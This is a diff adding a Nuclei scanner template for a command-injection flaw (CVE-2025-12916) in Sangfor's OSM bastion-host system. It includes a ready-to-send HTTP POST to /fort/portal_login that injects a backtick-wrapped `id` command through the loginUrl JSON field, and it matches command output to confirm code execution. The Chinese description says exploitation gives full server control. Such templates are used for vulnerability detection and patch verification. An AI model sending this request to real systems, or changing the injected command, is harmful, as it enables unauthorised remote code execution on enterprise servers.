@@ -1,0 +1,40 @@
+id: sangfor-osm-portal_login-rce
+
+info:
+  name: 深信服运维安全管理系统 portal_login 命令执行
+  author: PokerSec
+  severity: critical
+  description: 深信服运维安全管理系统（OSM）是深信服科技推出的一款企业级运维安全管理平台，主要用于提供堡垒主机功能。官方修复深信服运维安全管理系统远程命令执行漏洞(CVE-2025-12916)，该漏洞源于 portal_login、/protocol/session 等接口对请求参数校验不严，存在命令注入漏洞。攻击者可以通过构造恶意的JSON请求，在loginUrl参数中注入系统命令，利用反引号（`）执行任意系统命令。成功利用后可在目标服务器上执行任意系统命令，最终获取服务器的完全控制权限。
+  reference: 
+    - https://mp.weixin.qq.com/s/taECDDA9KBi3oNftfhizEg
+    - https://github.com/Fyw0o/PokerSec-nuclei-templates/blob/4a8dd14a0c4bce8e98d3bf2e117705e9a11c16bd/sxf-OSM-portal_login-rce.yaml#L4
+  classification:
+    cve-id: CVE-2025-12916
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: sangfor,rce,osm
+    
+
+http:
+  - raw:
+      - |
+        POST /fort/portal_login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        "{\"userName\":\"Bob\", \"loginUrl\":\"`id`\", \"role\": \"\", \"password\": \"12345678\"}" #
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
+      - type: status
+        status:
+          - 200
